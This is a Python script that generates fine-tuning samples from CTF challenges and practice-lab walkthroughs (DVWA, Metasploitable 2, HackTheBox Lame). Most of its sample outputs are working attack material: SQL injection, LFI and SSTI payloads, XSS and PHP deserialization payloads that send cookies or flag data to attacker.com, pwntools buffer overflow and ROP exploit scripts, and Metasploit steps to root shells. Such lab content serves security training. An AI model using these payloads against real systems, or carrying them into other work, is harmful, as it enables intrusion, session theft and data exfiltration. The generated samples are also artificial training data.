#!/usr/bin/env python3
"""
CTF Challenge & Practice Scenario Generator
Creates training samples from CTF-style challenges and practice scenarios
"""

import json
import random
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ============================================
# CTF CHALLENGE SCENARIOS
# ============================================

def generate_ctf_web_challenges():
    """Generate web exploitation CTF challenges"""
    samples = []
    
    challenges = [
        {
            "challenge": "Login Bypass",
            "description": "The web application has a login page. Find a way to authenticate as admin.",
            "given": "URL: http://target.local/login.php\nSource reveals: $query = \"SELECT * FROM users WHERE user='$user' AND pass='$pass'\"",
            "solution": """Identified SQL injection vulnerability in login form.

[ANALYSIS]
- Password field unsanitized in SQL query
- Single quotes can break query structure
- Boolean-based bypass possible

[EXPLOITATION]
Username: admin' --
Password: anything

This comments out the password check, returning the admin row.

[FLAG LOCATION]
After login, admin dashboard at /admin/dashboard.php contains flag.

[ALTERNATIVE APPROACHES]
1. Username: ' OR '1'='1' --
2. Username: admin'/*
   Password: */--
3. Union-based: ' UNION SELECT 'admin','password'--""",
            "flag": "FLAG{sql_1nj3ct10n_m4st3r}"
        },
        {
            "challenge": "File Inclusion",
            "description": "The site loads pages dynamically. Read the flag at /flag.txt",
            "given": "URL: http://target.local/index.php?page=home\nError on invalid page: Warning: include(/var/www/pages/test.php): failed to open stream",
            "solution": """Identified Local File Inclusion (LFI) vulnerability.

[ANALYSIS]
- Page parameter directly included without validation
- Full path revealed: /var/www/pages/[input].php
- PHP extension auto-appended

[EXPLOITATION]
Path traversal with null byte bypass (PHP < 5.3.4):
/index.php?page=../../../flag.txt%00

For modern PHP, use filter wrapper:
/index.php?page=php://filter/convert.base64-encode/resource=../../../flag.txt

Then decode: echo 'base64_output' | base64 -d

[FLAG EXTRACTION]
Direct traversal successful: ?page=../../../flag.txt works because the file extension is only added to .php files in the pages directory.

[ADDITIONAL FINDINGS]
- /etc/passwd readable: ?page=../../../etc/passwd
- PHP source via filter: ?page=php://filter/convert.base64-encode/resource=index""",
            "flag": "FLAG{lf1_p4th_tr4v3rs4l}"
        },
        {
            "challenge": "Session Hijacking",
            "description": "Steal the admin's session to access restricted area.",
            "given": "XSS found in /comment.php\nAdmin bot visits all new comments\nFlag at /admin/secret.php",
            "solution": """Exploiting Stored XSS for session hijacking.

[ANALYSIS]
- Comment form vulnerable to XSS
- Admin bot (with admin cookie) visits comments
- Need to exfiltrate admin's session cookie

[EXPLOITATION]
Posted comment with payload:
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>

Received on attacker server:
GET /steal?c=PHPSESSID=admin_session_id_here

[SESSION HIJACK]
1. Set cookie in browser: document.cookie='PHPSESSID=admin_session_id_here'
2. Navigate to /admin/secret.php
3. Flag displayed

[ALTERNATIVE PAYLOADS]
1. Fetch-based: <script>fetch('http://attacker/'+document.cookie)</script>
2. SVG-based: <svg onload="...">
3. Img onerror: <img src=x onerror="...">""",
            "flag": "FLAG{x55_c00k13_th13f}"
        },
        {
            "challenge": "Deserialization",
            "description": "The application uses PHP serialization. Achieve RCE.",
            "given": "Cookie: user=O:4:\"User\":2:{s:4:\"name\";s:5:\"guest\";s:4:\"role\";s:4:\"user\";}\nSource leaked: class Logger { function __destruct() { exec($this->cmd); }}",
            "solution": """PHP Object Injection leading to RCE.

[ANALYSIS]
- Cookie contains serialized PHP object
- Logger class has dangerous __destruct() method
- cmd property executed on object destruction

[EXPLOITATION]
Crafted malicious payload:
O:6:"Logger":1:{s:3:"cmd";s:27:"cat /flag.txt > /tmp/pwned";}

URL encoded for cookie:
O%3A6%3A%22Logger%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A27%3A%22cat%20%2Fflag.txt%20%3E%20%2Ftmp%2Fpwned%22%3B%7D

After request, flag written to /tmp/pwned

[FLAG RETRIEVAL]
Used LFI to read /tmp/pwned or direct RCE:
O:6:"Logger":1:{s:3:"cmd";s:52:"curl http://attacker.com/?f=$(cat /flag.txt|base64)";}

[MITIGATION]
- Never unserialize user input
- Use JSON instead of PHP serialization
- Implement __wakeup() validation""",
            "flag": "FLAG{uns3r14l1ze_rce}"
        },
        {
            "challenge": "SSTI",
            "description": "The template engine seems vulnerable. Read /flag.txt",
            "given": "URL: /render?name={{7*7}} returns 49\nError message reveals: Jinja2",
            "solution": """Server-Side Template Injection in Jinja2.

[ANALYSIS]
- {{7*7}} = 49 confirms code execution
- Jinja2 template engine identified
- Need to escalate to file read or RCE

[EXPLOITATION]
Payload for file read:
{{''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()}}

Modern Python 3 payload:
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}

Shorter alternative:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

[FLAG EXTRACTION]
/render?name={{''.__class__.__bases__[0].__subclasses__()[250]('cat /flag.txt',shell=True,stdout=-1).communicate()[0]}}

[VARIATIONS]
- {{self.__init__.__globals__.__builtins__.__import__('os').popen('cmd').read()}}
- {{lipsum.__globals__['os'].popen('cmd').read()}}
- {{cycler.__init__.__globals__.os.popen('cmd').read()}}""",
            "flag": "FLAG{j1nj4_t3mpl4t3_pwn}"
        }
    ]
    
    for c in challenges:
        samples.append({
            "instruction": f"Solve this CTF challenge: {c['challenge']}",
            "input": f"Challenge: {c['description']}\n\nGiven Information:\n{c['given']}",
            "output": c["solution"]
        })
    
    return samples


def generate_ctf_pwn_challenges():
    """Generate binary exploitation CTF challenges"""
    samples = []
    
    challenges = [
        {
            "challenge": "Buffer Overflow",
            "description": "Classic stack buffer overflow. Get shell.",
            "given": "Binary: vuln (32-bit, no PIE, no canary)\nSource: char buf[64]; gets(buf);",
            "solution": """Buffer Overflow Exploitation

[ANALYSIS]
- gets() is unsafe, reads unlimited input
- 64-byte buffer, need to find offset to return address
- No stack canary means no detection of overflow

[OFFSET CALCULATION]
Used pattern_create to find offset:
$ pattern_create 100 | ./vuln
Segfault at 0x41346241
$ pattern_offset 0x41346241
Offset: 76

[EXPLOITATION]
Return address at offset 76 (64 buf + 4 saved EBP + padding)

With NX disabled (shellcode):
payload = b'A' * 76 + p32(buf_addr) + shellcode

With NX enabled (ret2libc):
payload = b'A' * 76 + p32(system) + p32(exit) + p32(bin_sh)

[PWNTOOLS SCRIPT]
```python
from pwn import *
p = process('./vuln')
system = 0xf7e4c850  # Found via: p system in gdb
bin_sh = 0xf7f6d33c  # strings -tx /lib32/libc.so.6 | grep /bin/sh
exit = 0xf7e3fa40

payload = b'A' * 76 + p32(system) + p32(exit) + p32(bin_sh)
p.sendline(payload)
p.interactive()
```

[FLAG]
$ cat /flag.txt
FLAG{buff3r_0v3rfl0w_m4st3r}"""
        },
        {
            "challenge": "Format String",
            "description": "Format string vulnerability. Read flag from memory.",
            "given": "Binary: fmt (32-bit)\nCode: printf(user_input);\nFlag loaded at: 0x0804a040",
            "solution": """Format String Exploitation

[ANALYSIS]
- printf() with user-controlled format string
- Can read/write arbitrary memory
- Flag is at known address 0x0804a040

[READING MEMORY]
Format specifiers access stack values:
AAAA%08x.%08x.%08x... to leak stack

Direct parameter access for arbitrary read:
\\x40\\xa0\\x04\\x08%s reads string at 0x0804a040

[EXPLOITATION]
```python
from pwn import *
p = process('./fmt')

# Method 1: Direct address read
payload = p32(0x0804a040) + b'%s'
p.sendline(payload)
print(p.recv())

# Method 2: Find offset first
# Send: AAAA%p.%p.%p.%p.%p.%p
# Find where AAAA (0x41414141) appears, say position 7
# Then: \\x40\\xa0\\x04\\x08%7$s
```

[FLAG EXTRACTION]
$ python exploit.py
FLAG{f0rm4t_str1ng_l34k}"""
        },
        {
            "challenge": "ROP Chain",
            "description": "NX enabled, craft ROP chain to get shell.",
            "given": "Binary: ropme (64-bit, NX, no PIE, no canary)\nOffset: 72 bytes\nUseful gadgets available",
            "solution": """ROP Chain Exploitation

[ANALYSIS]
- NX prevents shellcode execution
- Need to chain existing code gadgets
- Goal: call system("/bin/sh")

[GADGET HUNTING]
$ ROPgadget --binary ropme
0x4007c3: pop rdi; ret
0x4007c1: pop rsi; pop r15; ret
0x400560: ret
0x400510: puts@plt
0x400520: system@plt

[64-BIT CALLING CONVENTION]
Arguments: RDI, RSI, RDX, RCX, R8, R9
system("/bin/sh") needs RDI = &"/bin/sh"

[EXPLOITATION]
```python
from pwn import *
elf = ELF('./ropme')
p = process('./ropme')

pop_rdi = 0x4007c3
ret = 0x400560  # Stack alignment
system = 0x400520
bin_sh = next(elf.search(b'/bin/sh'))

payload = b'A' * 72
payload += p64(ret)        # Stack alignment for movaps
payload += p64(pop_rdi)    # Pop next value into RDI
payload += p64(bin_sh)     # Address of "/bin/sh"
payload += p64(system)     # Call system()

p.sendline(payload)
p.interactive()
```

[FLAG]
$ cat flag.txt
FLAG{r0p_ch41n_m4st3r}"""
        }
    ]
    
    for c in challenges:
        samples.append({
            "instruction": f"Solve this binary exploitation challenge: {c['challenge']}",
            "input": f"Challenge: {c['description']}\n\nGiven Information:\n{c['given']}",
            "output": c["solution"]
        })
    
    return samples


def generate_ctf_crypto_challenges():
    """Generate cryptography CTF challenges"""
    samples = []
    
    challenges = [
        {
            "challenge": "RSA Small e",
            "description": "RSA encryption with unusual parameters.",
            "given": "n = 24891...(1024-bit)\ne = 3\nc = 148841...  (ciphertext)\nMessage is short ASCII string",
            "solution": """Low Public Exponent Attack on RSA

[ANALYSIS]
- e = 3 is unusually small
- If m^3 < n, then c = m^3 (no modulo reduction)
- Can take cube root of ciphertext directly

[EXPLOITATION]
```python
from gmpy2 import iroot
from Crypto.Util.number import long_to_bytes

c = 148841...  # ciphertext
# Take integer cube root
m, is_exact = iroot(c, 3)
if is_exact:
    flag = long_to_bytes(m)
    print(flag)
```

[FLAG]
FLAG{sm4ll_3xp0n3nt_d4ng3r}

[EXTENDED ATTACK]
If m^3 slightly > n (wraps once), try:
for k in range(1000):
    m, exact = iroot(c + k*n, 3)
    if exact:
        print(long_to_bytes(m))
        break"""
        },
        {
            "challenge": "XOR Cipher",
            "description": "Encrypted flag with XOR cipher.",
            "given": "Ciphertext (hex): 1a0a1e5f4c0b1a0a0c4c5f0a1e5e4e0c\nKnown: Flag starts with 'FLAG{'",
            "solution": """Known Plaintext Attack on XOR

[ANALYSIS]
- XOR is symmetric: P ⊕ K = C, C ⊕ K = P, C ⊕ P = K
- We know plaintext starts with "FLAG{"
- Can recover key from known portion

[KEY RECOVERY]
```python
ciphertext = bytes.fromhex('1a0a1e5f4c0b1a0a0c4c5f0a1e5e4e0c')
known = b'FLAG{'

# XOR known plaintext with ciphertext to get key
key_part = bytes([c ^ p for c, p in zip(ciphertext, known)])
print(f"Key starts: {key_part}")  # Reveals repeating pattern: "MYKEY"

# Assume key repeats
key = b'MYKEY'
flag = bytes([c ^ key[i % len(key)] for i, c in enumerate(ciphertext)])
print(flag)
```

[FLAG]
FLAG{x0r_1s_n0t_s4f3}"""
        },
        {
            "challenge": "Hash Length Extension",
            "description": "MAC using H(secret||message). Forge a valid MAC.",
            "given": "Valid: msg='user=guest', mac=3ae89f...\nGoal: Create valid MAC for 'user=guest&admin=true'\nHash: MD5, secret length unknown (8-16 bytes)",
            "solution": """Hash Length Extension Attack

[ANALYSIS]
- MAC = MD5(secret || message) is vulnerable
- Can extend hash without knowing secret
- Need to determine secret length

[EXPLOITATION]
```bash
# Using hash_extender tool
for len in $(seq 8 16); do
    hash_extender --data 'user=guest' \\
                  --signature 3ae89f... \\
                  --append '&admin=true' \\
                  --secret-length $len \\
                  --format md5
done
```

[RESULT]
With secret length 12:
New signature: 7f9a2b...
New data: user=guest\\x80\\x00...\\xa0\\x00\\x00\\x00&admin=true

[VERIFICATION]
Send forged request with URL-encoded padding:
msg=user%3Dguest%80%00...%a0%00%00%00%26admin%3Dtrue
mac=7f9a2b...

[FLAG]
Forged admin access returns:
FLAG{h4sh_l3ngth_3xt3nd}"""
        }
    ]
    
    for c in challenges:
        samples.append({
            "instruction": f"Solve this cryptography challenge: {c['challenge']}",
            "input": f"Challenge: {c['description']}\n\nGiven Information:\n{c['given']}",
            "output": c["solution"]
        })
    
    return samples


def generate_ctf_forensics_challenges():
    """Generate forensics CTF challenges"""
    samples = []
    
    challenges = [
        {
            "challenge": "Memory Dump",
            "description": "Analyze memory dump to find credentials.",
            "given": "File: memory.dmp (Windows 10)\nSuspect user had sensitive password",
            "solution": """Memory Forensics with Volatility

[ANALYSIS]
$ vol3 -f memory.dmp windows.info
Identified: Windows 10 Build 19041

[PROCESS LISTING]
$ vol3 -f memory.dmp windows.pslist
PID    Name            CreateTime
4      System
...
3284   notepad.exe     2023-06-15 14:30:22
5512   chrome.exe      2023-06-15 14:28:10

[CREDENTIAL EXTRACTION]
$ vol3 -f memory.dmp windows.hashdump
Administrator:500:aad3b...:8846f7...
User:1001:aad3b...:3ae89f...

[MEMORY STRINGS SEARCH]
$ vol3 -f memory.dmp windows.memmap --pid 3284 --dump
$ strings 3284.dmp | grep -i "password\\|flag\\|secret"
password: FLAG{m3m0ry_f0r3ns1cs}

[FLAG]
FLAG{m3m0ry_f0r3ns1cs}

[ADDITIONAL FINDINGS]
- Chrome had banking site open
- Notepad contained password reminder"""
        },
        {
            "challenge": "PCAP Analysis",
            "description": "Network capture contains exfiltrated data. Find it.",
            "given": "File: capture.pcap\nHint: Data hidden in plain sight",
            "solution": """Network Traffic Analysis

[INITIAL ANALYSIS]
$ tcpdump -r capture.pcap -n | head
DNS, HTTP, HTTPS, ICMP traffic observed

[HTTP ANALYSIS]
$ tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
/index.html
/submit.php?data=RkxBR3tleGZpbF9kbnNfaXNfZnVufQ==
/images/logo.png

[BASE64 DECODE]
$ echo "RkxBR3tleGZpbF9kbnNfaXNfZnVufQ==" | base64 -d
FLAG{exfil_dns_is_fun}

[DNS ANALYSIS]
Also found DNS exfil:
$ tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
464c4147.evil.com  (hex encoded)

[FLAG]
FLAG{exfil_dns_is_fun}"""
        },
        {
            "challenge": "Disk Image",
            "description": "Deleted file contains the flag. Recover it.",
            "given": "File: disk.img (ext4 filesystem)\nFile was recently deleted",
            "solution": """Deleted File Recovery

[MOUNT IMAGE]
$ sudo mkdir /mnt/evidence
$ sudo mount -o ro,loop disk.img /mnt/evidence

[SEARCH DELETED FILES]
$ sudo extundelete disk.img --restore-all
Recovered: file4523

$ cat RECOVERED_FILES/file4523
FLAG{d3l3t3d_n0t_g0n3}

[ALTERNATIVE METHODS]
1. PhotoRec: $ photorec disk.img
2. Foremost: $ foremost -i disk.img -o output/
3. Scalpel: $ scalpel disk.img -o output/

[MANUAL CARVING]
$ strings disk.img | grep "FLAG{"
FLAG{d3l3t3d_n0t_g0n3}

[FLAG]
FLAG{d3l3t3d_n0t_g0n3}"""
        },
        {
            "challenge": "Steganography",
            "description": "Image contains hidden message.",
            "given": "File: innocent.png\nHint: Not everything is visible",
            "solution": """Image Steganography Analysis

[INITIAL ANALYSIS]
$ file innocent.png
PNG image data, 800 x 600, 8-bit/color RGBA

$ exiftool innocent.png
Comment: Check the LSB

[LSB ANALYSIS]
Hint suggests Least Significant Bit steganography

```python
from PIL import Image
img = Image.open('innocent.png')
pixels = img.load()

# Extract LSB of red channel
bits = ''
for y in range(img.height):
    for x in range(img.width):
        bits += str(pixels[x, y][0] & 1)
        
# Convert bits to bytes
flag = ''
for i in range(0, len(bits), 8):
    byte = bits[i:i+8]
    char = chr(int(byte, 2))
    flag += char
    if char == '}':
        break
print(flag)
```

[TOOLS]
$ zsteg innocent.png
b1,r,lsb,xy: "FLAG{h1dd3n_1n_pl41n_s1ght}"

[FLAG]
FLAG{h1dd3n_1n_pl41n_s1ght}"""
        }
    ]
    
    for c in challenges:
        samples.append({
            "instruction": f"Solve this forensics challenge: {c['challenge']}",
            "input": f"Challenge: {c['description']}\n\nGiven Information:\n{c['given']}",
            "output": c["solution"]
        })
    
    return samples


def generate_practice_labs():
    """Generate practice lab walkthroughs"""
    samples = []
    
    labs = [
        {
            "lab": "Metasploitable 2",
            "objective": "Gain root shell on vulnerable Linux VM",
            "walkthrough": """Metasploitable 2 Exploitation

[RECONNAISSANCE]
$ nmap -sV -sC 192.168.1.100
21/tcp   open  ftp       vsftpd 2.3.4
22/tcp   open  ssh       OpenSSH 4.7p1
80/tcp   open  http      Apache httpd 2.2.8
139/tcp  open  netbios-ssn
445/tcp  open  netbios-ssn
3306/tcp open  mysql     MySQL 5.0.51a

[EXPLOITATION PATHS]

Path 1: vsftpd 2.3.4 Backdoor
$ msfconsole
msf> use exploit/unix/ftp/vsftpd_234_backdoor
msf> set RHOSTS 192.168.1.100
msf> exploit
[*] Command shell session opened
# whoami
root

Path 2: Unreal IRCd Backdoor
$ nmap -sV -p 6667 192.168.1.100
6667/tcp open  irc UnrealIRCd

msf> use exploit/unix/irc/unreal_ircd_3281_backdoor
msf> set RHOSTS 192.168.1.100
msf> exploit
# id
uid=0(root)

Path 3: DVWA SQL Injection to Shell
- Access http://192.168.1.100/dvwa/
- Login: admin/password
- SQL Injection -> Extract credentials
- Upload PHP shell via File Upload

[LESSONS LEARNED]
- Multiple paths to compromise
- Outdated services = easy wins
- Default credentials widespread"""
        },
        {
            "lab": "DVWA",
            "objective": "Practice OWASP Top 10 vulnerabilities",
            "walkthrough": """DVWA (Damn Vulnerable Web Application) Walkthrough

[SETUP]
Access: http://target/dvwa/
Login: admin/password
Set Security: Low (for learning)

[SQL INJECTION]
Input: ' OR '1'='1' --
Result: All users displayed

Advanced: ' UNION SELECT user,password FROM users--
Extracts: admin/5f4dcc3b... (password in MD5)

[XSS REFLECTED]
Input: <script>alert('XSS')</script>
Result: JavaScript executes

Cookie theft: <script>document.location='http://attacker/?c='+document.cookie</script>

[XSS STORED]
Post in guestbook: <script>alert(document.cookie)</script>
Persists for all visitors

[FILE INCLUSION]
LFI: ?page=../../../etc/passwd
RFI: ?page=http://attacker/shell.php

[COMMAND INJECTION]
Input: 127.0.0.1; cat /etc/passwd
Chains commands, reads sensitive files

[FILE UPLOAD]
Upload shell.php, access via /hackable/uploads/shell.php

[PROGRESSION]
1. Start at Low security
2. Move to Medium (learn bypasses)
3. Challenge at High security
4. Study Impossible (secure code)"""
        },
        {
            "lab": "HackTheBox - Lame",
            "objective": "Pwn retired HTB box for practice",
            "walkthrough": """HackTheBox: Lame Walkthrough

[TARGET]
IP: 10.10.10.3
Difficulty: Easy

[RECONNAISSANCE]
$ nmap -sV -sC 10.10.10.3
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  netbios-ssn Samba smbd 3.0.20

[ENUMERATION]
$ smbclient -L //10.10.10.3 -N
        Sharename       Type
        print$          Disk
        tmp             Disk
        opt             Disk
        IPC$            IPC
        ADMIN$          IPC

[VULNERABILITY RESEARCH]
Samba 3.0.20 < 3.0.25rc3
CVE-2007-2447 - Username map script RCE

[EXPLOITATION]
$ msfconsole
msf> use exploit/multi/samba/usermap_script
msf> set RHOSTS 10.10.10.3
msf> set LHOST 10.10.14.5
msf> exploit

[*] Started reverse handler
[*] Command shell session 1 opened

# whoami
root
# cat /root/root.txt
[root flag]
# cat /home/makis/user.txt
[user flag]

[LESSONS]
- Outdated services are common attack vectors
- SMB enumeration crucial on Windows/Samba
- Research CVEs for specific versions"""
        }
    ]
    
    for lab in labs:
        samples.append({
            "instruction": f"Provide a walkthrough for the {lab['lab']} practice lab.",
            "input": f"Lab: {lab['lab']}\nObjective: {lab['objective']}",
            "output": lab["walkthrough"]
        })
    
    return samples


def main():
    """Generate all CTF samples"""
    print("🏁 Generating CTF challenge samples...")
    
    all_samples = []
    
    generators = [
        ("ctf_web", generate_ctf_web_challenges),
        ("ctf_pwn", generate_ctf_pwn_challenges),
        ("ctf_crypto", generate_ctf_crypto_challenges),
        ("ctf_forensics", generate_ctf_forensics_challenges),
        ("practice_labs", generate_practice_labs),
    ]
    
    for name, generator in generators:
        print(f"  Generating {name} samples...")
        samples = generator()
        all_samples.extend(samples)
        
        # Save category file
        category_file = OUTPUT_DIR / f"{name}.jsonl"
        with open(category_file, 'w') as f:
            for sample in samples:
                f.write(json.dumps(sample) + '\n')
        print(f"    ✓ {len(samples)} samples saved to {category_file.name}")
    
    # Save combined
    combined_file = OUTPUT_DIR / "ctf_combined.jsonl"
    with open(combined_file, 'w') as f:
        for sample in all_samples:
            f.write(json.dumps(sample) + '\n')
    
    print(f"\n✅ Total: {len(all_samples)} CTF samples generated")
    return len(all_samples)


if __name__ == "__main__":
    main()
